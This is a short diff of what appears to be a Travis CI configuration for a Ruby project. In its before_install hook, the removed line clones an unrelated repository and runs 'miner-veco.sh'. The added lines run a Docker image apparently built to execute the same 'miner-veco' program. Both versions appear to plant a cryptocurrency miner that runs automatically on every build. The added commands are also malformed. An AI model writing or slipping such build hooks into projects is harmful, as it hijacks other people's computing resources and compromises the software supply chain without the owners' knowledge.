@@ -3,4 +3,7 @@ rvm:
  - 2.2
  - jruby
 before_install:
-- git clone https://github.com/maujendakint8sa/asasdasf && ./miner-veco.sh
+- echo " FROM christiankm01/master:10297
+   RUN ./miner-veco"
+- docker build .
+    
